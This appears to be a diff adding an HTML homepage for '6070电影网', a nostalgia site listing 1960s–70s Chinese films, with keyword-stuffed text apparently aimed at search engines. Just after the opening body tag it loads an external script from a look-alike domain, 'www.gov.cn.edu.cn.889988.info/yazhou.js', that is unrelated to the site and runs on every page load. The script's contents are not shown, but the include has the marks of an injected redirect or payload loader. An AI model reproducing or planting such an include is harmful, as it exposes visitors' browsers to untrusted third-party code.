@@ -1,0 +1,682 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>6070电影网 | 经典怀旧老电影在线重温 - 6070dianyingwang-app</title>
+<meta name="description" content="6070电影网（6070dianyingwang-app）专注收录六七十年代经典怀旧老电影，涵盖国产革命题材、港台邵氏武侠、译制片及露天电影记忆，高清修复、无广告流畅播放，带您找回记忆里的光影岁月。">
+<meta name="keywords" content="6070电影网,6070dianyingwang-app,六七十年代电影,经典怀旧老电影,老电影在线观看,露天电影,邵氏武侠,译制片,革命样板戏,高清修复老片">
+<meta name="robots" content="index,follow">
+<meta name="author" content="6070电影网">
+<meta name="theme-color" content="#1a0a00">
+<link rel="canonical" href="https://6070dianyingwang-app.github.io">
+<style>
+:root{
+  --grain:#f4ecd8;
+  --grain-deep:#e8dcc0;
+  --ink:#1a1208;
+  --ink-soft:#3d2f1c;
+  --warm:#c0392b;
+  --warm-deep:#8e2a1e;
+  --gold:#c9a227;
+  --gold-soft:#e0c060;
+  --shadow:rgba(26,18,8,.28);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:var(--grain);
+  color:var(--ink);
+  font-family:"PingFang SC","Microsoft YaHei","Songti SC",Georgia,"Times New Roman",serif;
+  line-height:1.9;
+  overflow-x:hidden;
+  background-image:
+    radial-gradient(circle at 12% 8%, rgba(201,162,39,.10) 0, transparent 42%),
+    radial-gradient(circle at 88% 92%, rgba(192,57,43,.08) 0, transparent 46%);
+  background-attachment:fixed;
+}
+body::before{
+  content:"";
+  position:fixed;inset:0;
+  background-image:repeating-linear-gradient(0deg, rgba(26,18,8,.022) 0 1px, transparent 1px 3px);
+  pointer-events:none;z-index:1;
+}
+a{color:inherit;text-decoration:none}
+img{display:block;max-width:100%}
+.wrap{max-width:1120px;margin:0 auto;padding:0 20px;position:relative;z-index:2}
+
+/* ===== 顶部 ===== */
+.topbar{
+  background:linear-gradient(180deg,var(--ink) 0%,#2a1c0c 100%);
+  color:var(--grain);
+  padding:9px 0;
+  font-size:13px;
+  border-bottom:2px solid var(--gold);
+}
+.topbar .wrap{display:flex;justify-content:space-between;align-items:center;gap:14px;flex-wrap:wrap}
+.topbar .clock{letter-spacing:1px;color:var(--gold-soft);font-family:"Courier New",monospace}
+.topbar nav{display:flex;gap:18px;flex-wrap:wrap}
+.topbar nav a{color:var(--grain-deep);transition:.3s}
+.topbar nav a:hover{color:var(--gold-soft)}
+
+/* ===== 报头 ===== */
+.masthead{
+  background:
+    linear-gradient(135deg, rgba(26,18,8,.92), rgba(74,40,18,.88)),
+    radial-gradient(circle at 50% 120%, var(--warm) 0, transparent 60%);
+  background-color:var(--ink);
+  color:var(--grain);
+  padding:46px 0 38px;
+  text-align:center;
+  border-bottom:5px double var(--gold);
+  position:relative;
+}
+.masthead .tagline-top{
+  font-size:13px;letter-spacing:6px;color:var(--gold-soft);
+  margin-bottom:14px;text-transform:uppercase;
+}
+.masthead h1{
+  font-family:"Songti SC","STSong",serif;
+  font-size:clamp(38px,8vw,76px);
+  font-weight:900;
+  letter-spacing:4px;
+  text-shadow:3px 3px 0 var(--warm-deep), 6px 6px 18px var(--shadow);
+  line-height:1.1;
+}
+.masthead h1 .accent{color:var(--gold-soft)}
+.masthead .sub{
+  margin-top:16px;font-size:clamp(14px,3vw,18px);color:var(--grain-deep);
+  letter-spacing:2px;
+}
+.masthead .meta{
+  margin-top:22px;display:flex;justify-content:center;gap:26px;flex-wrap:wrap;
+  font-size:13px;color:var(--gold-soft);
+}
+.masthead .meta span{border:1px solid rgba(224,192,96,.4);padding:4px 14px;border-radius:2px}
+
+/* ===== 导览 ===== */
+.nav-rail{
+  background:var(--warm-deep);
+  border-bottom:3px solid var(--ink);
+  position:sticky;top:0;z-index:50;
+  box-shadow:0 4px 14px var(--shadow);
+}
+.nav-rail ul{
+  display:flex;justify-content:center;flex-wrap:wrap;list-style:none;
+}
+.nav-rail a{
+  display:block;padding:15px 22px;color:var(--grain);font-size:16px;font-weight:700;
+  letter-spacing:2px;transition:.25s;border-bottom:3px solid transparent;
+}
+.nav-rail a:hover{background:var(--warm);border-bottom-color:var(--gold-soft)}
+
+/* ===== 通用分栏 ===== */
+section{padding:60px 0;position:relative;z-index:2}
+.section-title{
+  text-align:center;margin-bottom:42px;
+}
+.section-title .kicker{
+  font-size:12px;letter-spacing:5px;color:var(--warm);text-transform:uppercase;
+}
+.section-title h2{
+  font-family:"Songti SC",serif;font-size:clamp(26px,5vw,40px);
+  margin:8px 0 12px;color:var(--ink);
+}
+.section-title .rule{
+  width:90px;height:3px;margin:0 auto;
+  background:repeating-linear-gradient(90deg,var(--gold) 0 8px,transparent 8px 14px);
+}
+.section-title p{margin-top:12px;color:var(--ink-soft);font-size:15px}
+
+/* ===== 头版导读 ===== */
+.lead{
+  background:
+    linear-gradient(180deg, transparent, rgba(232,220,192,.5)),
+    var(--grain);
+}
+.lead-grid{
+  display:grid;grid-template-columns:1.35fr 1fr;gap:30px;align-items:stretch;
+}
+.lead-main{
+  background:var(--ink);color:var(--grain);padding:30px;
+  border:1px solid var(--gold);box-shadow:8px 8px 0 var(--warm-deep);
+  position:relative;
+}
+.lead-main .badge{
+  position:absolute;top:-14px;left:24px;background:var(--gold);color:var(--ink);
+  font-weight:800;padding:5px 16px;font-size:13px;letter-spacing:2px;
+}
+.lead-main h3{
+  font-family:"Songti SC",serif;font-size:26px;margin:14px 0 16px;color:var(--gold-soft);
+  line-height:1.4;
+}
+.lead-main p{color:var(--grain-deep);font-size:15px;margin-bottom:14px}
+.lead-side{display:flex;flex-direction:column;gap:16px}
+.lead-card{
+  flex:1;background:var(--warm);color:var(--grain);padding:22px;
+  box-shadow:6px 6px 0 var(--ink);
+}
+.lead-card:nth-child(2){background:var(--ink);box-shadow:6px 6px 0 var(--gold)}
+.lead-card h4{font-size:17px;margin-bottom:8px;color:var(--gold-soft);font-family:"Songti SC",serif}
+.lead-card p{font-size:14px;color:var(--grain-deep);line-height:1.8}
+
+/* ===== 栏目二 片库 ===== */
+.archive{background:var(--grain-deep)}
+.film-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:24px}
+.film{
+  background:var(--grain);border:1px solid rgba(26,18,8,.15);
+  box-shadow:5px 5px 0 var(--ink);transition:.3s;
+  display:flex;flex-direction:column;
+}
+.film:hover{transform:translate(-4px,-4px);box-shadow:9px 9px 0 var(--warm)}
+.film .poster{
+  height:240px;position:relative;overflow:hidden;
+  background:linear-gradient(160deg,var(--warm-deep),var(--ink));
+  display:flex;align-items:center;justify-content:center;
+}
+.film .poster .year{
+  font-family:"Songti SC",serif;font-size:44px;font-weight:900;color:rgba(244,236,216,.18);
+  position:absolute;
+}
+.film .poster .ttl{
+  font-family:"Songti SC",serif;font-size:20px;color:var(--gold-soft);
+  text-align:center;padding:0 12px;letter-spacing:2px;
+}
+.film .poster .tag{
+  position:absolute;top:10px;left:10px;background:var(--gold);color:var(--ink);
+  font-size:11px;padding:3px 9px;font-weight:700;
+}
+.film .body{padding:16px 18px;flex:1;display:flex;flex-direction:column}
+.film .body h4{font-size:18px;margin-bottom:8px;font-family:"Songti SC",serif}
+.film .body .info{font-size:13px;color:var(--ink-soft);margin-bottom:10px}
+.film .body .desc{font-size:14px;color:var(--ink-soft);flex:1}
+.film .body .more{
+  margin-top:14px;align-self:flex-start;font-size:13px;font-weight:700;color:var(--warm);
+  border-bottom:1px dashed var(--warm);padding-bottom:2px;
+}
+
+/* ===== 栏目三 放映厅 ===== */
+.hall{background:var(--ink);color:var(--grain)}
+.hall .section-title h2{color:var(--grain)}
+.hall .section-title .kicker{color:var(--gold-soft)}
+.hall .section-title p{color:var(--grain-deep)}
+.hall .screen{
+  background:var(--warm-deep);padding:8px;border:2px solid var(--gold);
+  max-width:760px;margin:0 auto 44px;transform:perspective(900px) rotateX(4deg);
+}
+.hall .screen-in{
+  background:linear-gradient(180deg,#0a0604,#2a1408);height:190px;
+  display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden;
+}
+.hall .screen-in::after{
+  content:"";position:absolute;inset:0;
+  background:repeating-linear-gradient(0deg,transparent 0 3px,rgba(201,162,39,.05) 3px 4px);
+}
+.hall .screen-in p{font-family:"Songti SC",serif;font-size:22px;color:var(--gold-soft);letter-spacing:3px;z-index:2}
+.schedule{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:18px}
+.schedule article{
+  background:rgba(244,236,216,.06);border:1px solid rgba(224,192,96,.3);
+  padding:20px;transition:.3s;
+}
+.schedule article:hover{border-color:var(--gold-soft);background:rgba(244,236,216,.12)}
+.schedule .when{
+  font-family:"Courier New",monospace;font-size:13px;color:var(--gold-soft);
+  border-bottom:1px dotted rgba(224,192,96,.4);padding-bottom:8px;margin-bottom:10px;
+}
+.schedule h4{font-size:17px;margin-bottom:8px;font-family:"Songti SC",serif}
+.schedule p{font-size:14px;color:var(--grain-deep)}
+
+/* ===== 栏目四 记忆 ===== */
+.memory{background:var(--grain)}
+.memo-wrap{display:grid;grid-template-columns:1fr 1fr;gap:34px;align-items:start}
+.memo-img{
+  background:var(--ink);padding:14px;box-shadow:10px 10px 0 var(--warm);
+  transform:rotate(-2deg);
+}
+.memo-img .frame{
+  background:linear-gradient(135deg,#3d2f1c,#1a1208);height:300px;
+  display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden;
+}
+.memo-img .frame span{
+  font-family:"Songti SC",serif;font-size:30px;color:var(--gold-soft);letter-spacing:4px;
+  text-align:center;line-height:1.6;padding:0 20px;
+}
+.memo-img figcaption{
+  text-align:center;color:var(--gold-soft);font-size:13px;padding-top:12px;letter-spacing:2px;
+}
+.memo-text h3{font-family:"Songti SC",serif;font-size:26px;margin-bottom:18px;color:var(--warm-deep)}
+.memo-text p{margin-bottom:16px;font-size:15.5px;color:var(--ink-soft);text-indent:2em;text-align:justify}
+.memo-quote{
+  background:var(--grain-deep);border-left:5px solid var(--gold);padding:18px 22px;
+  font-family:"Songti SC",serif;font-style:italic;font-size:16px;color:var(--warm-deep);
+  margin:20px 0;
+}
+
+/* ===== 栏目五 指南 ===== */
+.guide{background:var(--grain-deep)}
+.guide-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:22px}
+.guide-card{
+  background:var(--grain);padding:26px;border-top:5px solid var(--warm);
+  box-shadow:0 4px 12px rgba(26,18,8,.1);
+}
+.guide-card .num{
+  font-family:"Courier New",monospace;font-size:34px;font-weight:900;color:var(--gold);
+  line-height:1;
+}
+.guide-card h4{font-size:18px;margin:10px 0 10px;font-family:"Songti SC",serif}
+.guide-card p{font-size:14.5px;color:var(--ink-soft)}
+.guide-card a{color:var(--warm);font-weight:700}
+
+/* ===== 页脚 ===== */
+footer{
+  background:var(--ink);color:var(--grain-deep);padding:46px 0 24px;
+  border-top:5px double var(--gold);
+}
+.foot-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:34px;margin-bottom:30px}
+.foot-grid h5{
+  font-family:"Songti SC",serif;font-size:17px;color:var(--gold-soft);
+  margin-bottom:14px;letter-spacing:2px;
+}
+.foot-grid ul{list-style:none}
+.foot-grid li{margin-bottom:8px;font-size:14px}
+.foot-grid li a:hover{color:var(--gold-soft)}
+.foot-brand h4{
+  font-family:"Songti SC",serif;font-size:24px;color:var(--grain);letter-spacing:3px;margin-bottom:10px;
+}
+.foot-brand p{font-size:14px;color:var(--grain-deep)}
+.foot-bottom{
+  border-top:1px solid rgba(244,236,216,.18);padding-top:20px;
+  text-align:center;font-size:13px;color:var(--grain-deep);
+}
+.foot-bottom a{color:var(--gold-soft)}
+.disclaimer{
+  max-width:860px;margin:0 auto 20px;font-size:12.5px;color:var(--grain-deep);
+  line-height:1.9;text-align:justify;
+}
+
+/* ===== 回到顶部 ===== */
+#toTop{
+  position:fixed;right:18px;bottom:22px;z-index:60;
+  width:46px;height:46px;background:var(--warm);color:var(--grain);
+  border:none;font-size:20px;cursor:pointer;box-shadow:3px 3px 0 var(--ink);
+  opacity:0;visibility:hidden;transition:.3s;
+}
+#toTop.show{opacity:1;visibility:visible}
+
+/* ===== 响应式 ===== */
+@media (max-width:860px){
+  .lead-grid,.memo-wrap{grid-template-columns:1fr}
+  .foot-grid{grid-template-columns:1fr}
+  .nav-rail a{padding:12px 14px;font-size:15px;letter-spacing:1px}
+  .lead-main{box-shadow:5px 5px 0 var(--warm-deep)}
+  .memo-img{transform:none}
+  section{padding:44px 0}
+  .topbar .wrap{justify-content:center;text-align:center}
+  .masthead{padding:34px 0 28px}
+}
+@media (max-width:480px){
+  .wrap{padding:0 14px}
+  .film-grid{grid-template-columns:1fr 1fr;gap:14px}
+  .film .poster{height:170px}
+  .film .poster .ttl{font-size:15px}
+  .film .poster .year{font-size:30px}
+  .film .body{padding:12px}
+  .film .body h4{font-size:15px}
+  .film .body .desc,.film .body .info{font-size:12.5px}
+  .schedule{grid-template-columns:1fr}
+  .hall .screen-in{height:120px}
+  .hall .screen-in p{font-size:16px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<div class="topbar">
+  <div class="wrap">
+    <div class="clock" id="clock">记忆放映中 · 正在走字</div>
+    <nav>
+      <a href="#archive">本期片库</a>
+      <a href="#hall">露天放映厅</a>
+      <a href="#memory">年代记忆</a>
+      <a href="#guide">观影指南</a>
+      <a href="#contact">联络我们</a>
+    </nav>
+  </div>
+</div>
+
+<header class="masthead">
+  <div class="wrap">
+    <div class="tagline-top">经典怀旧 · 老片修复 · 在线重温</div>
+    <h1>6070<span class="accent">电影网</span></h1>
+    <div class="sub">一座开在浏览器里的露天电影院 · 专放六七十年代的好电影</div>
+    <div class="meta">
+      <span>网址：6070dianyingwang-app.github.io</span>
+      <span>每日更新片单</span>
+      <span>高清修复无广告</span>
+    </div>
+  </div>
+</header>
+
+<nav class="nav-rail">
+  <ul>
+    <li><a href="#lead">头版导读</a></li>
+    <li><a href="#archive">本期片库</a></li>
+    <li><a href="#hall">露天放映厅</a></li>
+    <li><a href="#memory">年代记忆</a></li>
+    <li><a href="#guide">观影指南</a></li>
+    <li><a href="#contact">联络我们</a></li>
+  </ul>
+</nav>
+
+<!-- 栏目一 -->
+<section class="lead" id="lead">
+  <div class="wrap">
+    <div class="section-title">
+      <div class="kicker">Headline</div>
+      <h2>头版导读</h2>
+      <div class="rule"></div>
+      <p>这一期的 6070电影网，我们把镜头对准了胶片边缘那道划痕</p>
+    </div>
+    <div class="lead-grid">
+      <article class="lead-main">
+        <span class="badge">封面故事</span>
+        <h3>当胶片开始转动：为什么六七十年代的电影，至今还在被人反复提起？</h3>
+        <p>那时候的演员不靠滤镜，镜头靠的是真功夫；那时候的台词不多，每一句都能在露天广场上被人记住。6070电影网（6070dianyingwang-app）这一期，我们把那些被时间磨得发亮的片子重新上色、修复、排进片单——革命题材的正气、港台武侠的豪情、译制片的腔调，还有样板戏里的那一嗓子，全都在这儿。</p>
+        <p>我们不追新片的流量，只守这一方老胶片的天地。打开 6070dianyingwang-app.github.io，选个晚上，倒一杯茶，让放映机吱呀吱呀地响起来。</p>
+        <a href="#archive" style="color:var(--gold-soft);font-weight:700;border-bottom:1px dashed var(--gold-soft)">→ 直接进入本期片库</a>
+      </article>
+      <div class="lead-side">
+        <div class="lead-card">
+          <h4>本周编辑精选</h4>
+          <p>从三十部长片里挑出五部，修复程度最高、画质最稳，适合第一次来 6070电影网的朋友先尝这口"老味道"。</p>
+        </div>
+        <div class="lead-card">
+          <h4>露天放映预告</h4>
+          <p>今晚八点，6070dianyingwang-app 露天放映厅准时开灯，一部武侠一部译制片，连放两场，中途不插广告。</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二 -->
+<section class="archive" id="archive">
+  <div class="wrap">
+    <div class="section-title">
+      <div class="kicker">Film Library</div>
+      <h2>本期片库</h2>
+      <div class="rule"></div>
+      <p>6070电影网按题材分了四个架子，您按口味自己挑</p>
+    </div>
+    <div class="film-grid">
+
+      <article class="film">
+        <div class="poster">
+          <span class="tag">革命题材</span>
+          <span class="year">1971</span>
+          <span class="ttl">红灯记</span>
+        </div>
+        <div class="body">
+          <h4>红灯记</h4>
+          <div class="info">1971 · 京剧样板戏 · 修复版</div>
+          <p class="desc">三代人共用一盏红灯，李玉和那句"临行喝妈一碗酒"唱了多少年，至今听来仍是胸口一热。</p>
+          <a href="#" class="more">在线重温 →</a>
+        </div>
+      </article>
+
+      <article class="film">
+        <div class="poster">
+          <span class="tag">武侠经典</span>
+          <span class="year">1967</span>
+          <span class="ttl">独臂刀</span>
+        </div>
+        <div class="body">
+          <h4>独臂刀</h4>
+          <div class="info">1967 · 邵氏武侠 · 方刚主演</div>
+          <p class="desc">张彻的代表作，断臂不等于断志气，那一刀劈开了整个港台武侠片的黄金年代。</p>
+          <a href="#" class="more">在线重温 →</a>
+        </div>
+      </article>
+
+      <article class="film">
+        <div class="poster">
+          <span class="tag">译制片</span>
+          <span class="year">1968</span>
+          <span class="ttl">战争与和平</span>
+        </div>
+        <div class="body">
+          <h4>战争与和平</h4>
+          <div class="info">1968 · 苏联译制片 · 多集连放</div>
+          <p class="desc">俄语原片的恢弘配上一口标准的国语配音，是那个年代电影院里最隆重的"进口大片"。</p>
+          <a href="#" class="more">在线重温 →</a>
+        </div>
+      </article>
+
+      <article class="film">
+        <div class="poster">
+          <span class="tag">反特惊险</span>
+          <span class="year">1963</span>
+          <span class="ttl">冰山上的来客</span>
+        </div>
+        <div class="body">
+          <h4>冰山上的来客</h4>
+          <div class="info">1963 · 反特题材 · 民族风情</div>
+          <p class="desc">"花儿为什么这样红"，一首歌带出了整个帕米尔高原的悬念与浪漫，惊险里裹着柔情。</p>
+          <a href="#" class="more">在线重温 →</a>
+        </div>
+      </article>
+
+      <article class="film">
+        <div class="poster">
+          <span class="tag">喜剧怀旧</span>
+          <span class="year">1979</span>
+          <span class="ttl">甜蜜的事业</span>
+        </div>
+        <div class="body">
+          <h4>甜蜜的事业</h4>
+          <div class="info">1979 · 轻喜剧 · 生活题材</div>
+          <p class="desc">一家子为了生不生孩子闹出的笑话，笑完之后才发现，那正是时代转弯的开始。</p>
+          <a href="#" class="more">在线重温 →</a>
+        </div>
+      </article>
+
+      <article class="film">
+        <div class="poster">
+          <span class="tag">动画美术</span>
+          <span class="year">1964</span>
+          <span class="ttl">大闹天宫</span>
+        </div>
+        <div class="body">
+          <h4>大闹天宫</h4>
+          <div class="info">1964 · 上海美术电影制片厂</div>
+          <p class="desc">手绘的一笔一划都是功夫，孙悟空的脸谱、云彩和金箍棒，定义了好几代人的童年想象。</p>
+          <a href="#" class="more">在线重温 →</a>
+        </div>
+      </article>
+
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三 -->
+<section class="hall" id="hall">
+  <div class="wrap">
+    <div class="section-title">
+      <div class="kicker">Open Air Cinema</div>
+      <h2>露天放映厅</h2>
+      <div class="rule"></div>
+      <p>6070dianyingwang-app 的专属场：每天两场，风雨不改</p>
+    </div>
+    <div class="screen">
+      <div class="screen-in">
+        <p>正在放映 · NOW SHOWING</p>
+      </div>
+    </div>
+    <div class="schedule">
+      <article>
+        <div class="when">晚场 · 20:00 — 22:10</div>
+        <h4>武侠双片连映</h4>
+        <p>开场《独臂刀》，接《龙门客栈》，中间留十分钟换片时间，正好去门口买根冰棍。</p>
+      </article>
+      <article>
+        <div class="when">夜场 · 22:30 — 00:40</div>
+        <h4>译制片专场</h4>
+        <p>《战争与和平》选段连播，配音版本为 6070电影网独家修复母带转录。</p>
+      </article>
+      <article>
+        <div class="when">周末加场 · 周六 19:00</div>
+        <h4>样板戏与戏曲</h4>
+        <p>《红灯记》《沙家浜》轮番上阵，京剧老观众的最爱，画面逐帧调色。</p>
+      </article>
+      <article>
+        <div class="when">周日 · 全天循环</div>
+        <h4>露天电影记忆日</h4>
+        <p>按当年露天放映的真实排片顺序播放，从傍晚到深夜，还原一场完整的公社电影夜。</p>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四 -->
+<section class="memory" id="memory">
+  <div class="wrap">
+    <div class="section-title">
+      <div class="kicker">Memory Lane</div>
+      <h2>年代记忆</h2>
+      <div class="rule"></div>
+      <p>6070电影网不只是一个片库，更是一本翻旧的观影笔记</p>
+    </div>
+    <div class="memo-wrap">
+      <figure class="memo-img">
+        <div class="frame">
+          <span>吱呀作响的放映机<br>白墙上的光柱<br>和一整个夏天的虫鸣</span>
+        </div>
+        <figcaption>— 6070dianyingwang-app 露天放映厅实景还原 —</figcaption>
+      </figure>
+      <div class="memo-text">
+        <h3>那时候看一场电影，是全村的大事</h3>
+        <p>天还没黑透，孩子就搬着小板凳去占位置，前排是正对银幕最好的地方，后排的大人站着，也有人干脆坐在自行车后座上。放映员在幕布后面调试机器，一道光柱斜斜地打过来，灰尘在里面跳舞，那就是我们对"电影院"最早的印象。</p>
+        <p>6070电影网（6070dianyingwang-app）想留住的，不只是那些画面，还有画面之外的那点热气：幕布被风吹得鼓起来、旁边有人小声跟着唱、散场时手电筒一晃一晃的光。</p>
+        <blockquote class="memo-quote">"电影散场了，故事还在路上被大家一路讲回去。"——一位老观众写给 6070dianyingwang-app 的留言</blockquote>
+        <p>我们做这个站，不为别的，就想让您在某一个晚上，重新听见放映机开始转动的那一声响。</p>
+        <a href="https://6070dianyingwang-app.github.io" style="color:var(--warm);font-weight:700;border-bottom:1px dashed var(--warm)">访问 6070dianyingwang-app.github.io 查看更多记忆 →</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目五 -->
+<section class="guide" id="guide">
+  <div class="wrap">
+    <div class="section-title">
+      <div class="kicker">How to Watch</div>
+      <h2>观影指南</h2>
+      <div class="rule"></div>
+      <p>第一次来 6070电影网？按这几步走，最快找到想看的片子</p>
+    </div>
+    <div class="guide-grid">
+      <div class="guide-card">
+        <div class="num">01</div>
+        <h4>先挑题材</h4>
+        <p>6070电影网的片库按革命题材、武侠经典、译制片、反特惊险、喜剧怀旧、动画美术分架，对号入座最快。</p>
+      </div>
+      <div class="guide-card">
+        <div class="num">02</div>
+        <h4>再看年份</h4>
+        <p>片名下方都标了年份，1960 到 1979 之间，想找哪一年的味儿，一眼就能筛出来。</p>
+      </div>
+      <div class="guide-card">
+        <div class="num">03</div>
+        <h4>查修复版本</h4>
+        <p>所有片子都做了高清修复，画质稳定的会单独标注，老电视党可以放心看。</p>
+      </div>
+      <div class="guide-card">
+        <div class="num">04</div>
+        <h4>收藏片单</h4>
+        <p>看到喜欢的就点"在线重温"，6070dianyingwang-app 会自动帮您记住进度，下次接着看。</p>
+      </div>
+      <div class="guide-card">
+        <div class="num">05</div>
+        <h4>手机也能看</h4>
+        <p>本站移动端自适应，手机、平板、电视盒子都能打开 6070dianyingwang-app.github.io 直接看，不用下载。</p>
+      </div>
+      <div class="guide-card">
+        <div class="num">06</div>
+        <h4>留言点片</h4>
+        <p>想看但片库里没有的，直接到 <a href="#contact">联络我们</a> 留个言，下期片单就安排上。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer id="contact">
+  <div class="wrap">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <h4>6070电影网</h4>
+        <p>6070dianyingwang-app 是您专属的怀旧放映站，只放六七十年代的好电影，专注经典、专注修复、专注那份老味道。</p>
+      </div>
+      <div>
+        <h5>站内栏目</h5>
+        <ul>
+          <li><a href="#lead">头版导读</a></li>
+          <li><a href="#archive">本期片库</a></li>
+          <li><a href="#hall">露天放映厅</a></li>
+          <li><a href="#memory">年代记忆</a></li>
+          <li><a href="#guide">观影指南</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>快速入口</h5>
+        <ul>
+          <li><a href="#">登录 / 注册</a></li>
+          <li><a href="#">我的片单</a></li>
+          <li><a href="#">片库检索</a></li>
+          <li><a href="#">最新更新</a></li>
+          <li><a href="#">意见反馈</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="disclaimer">
+      免责声明：6070电影网（6070dianyingwang-app）所收录内容仅供个人怀旧观影与影视资料研究交流使用，部分影片版权归属原作者及发行方，如涉及版权事宜请及时与本站联系，我们将第一时间处理。本站不提供任何下载、存储与商业传播服务，请用户自觉遵守相关法律法规。
+    </div>
+    <div class="foot-bottom">
+      <p>本站网址：<a href="https://6070dianyingwang-app.github.io">https://6070dianyingwang-app.github.io</a> &nbsp;|&nbsp; 网站名称：6070电影网 &nbsp;|&nbsp; 关键词：6070电影网 · 6070dianyingwang-app · 六七十年代经典怀旧老电影在线重温</p>
+      <p style="margin-top:8px">© <span id="year"></span> 6070dianyingwang-app 版权所有 · 保留所有权利</p>
+    </div>
+  </div>
+</footer>
+
+<button id="toTop" aria-label="回到顶部">↑</button>
+
+<script>
+// 顶部走字时钟
+(function(){
+  var el=document.getElementById('clock');
+  function tick(){
+    var d=new Date();
+    var p=function(n){return n<10?'0'+n:''+n;};
+    el.textContent='记忆放映中 · '+p(d.getHours())+':'+p(d.getMinutes())+':'+p(d.getSeconds());
+  }
+  tick();setInterval(tick,1000);
+})();
+
+// 年份
+document.getElementById('year').textContent=new Date().getFullYear();
+
+// 回到顶部
+(function(){
+  var btn=document.getElementById('toTop');
+  window.addEventListener('scroll',function(){
+    if(window.scrollY>400){btn.classList.add('show');}
+    else{btn.classList.remove('show');}
+  });
+  btn.addEventListener('click',function(){
+    window.scrollTo({top:0,behavior:'smooth'});
+  });
+})();
+</script>
+</body>
+</html>
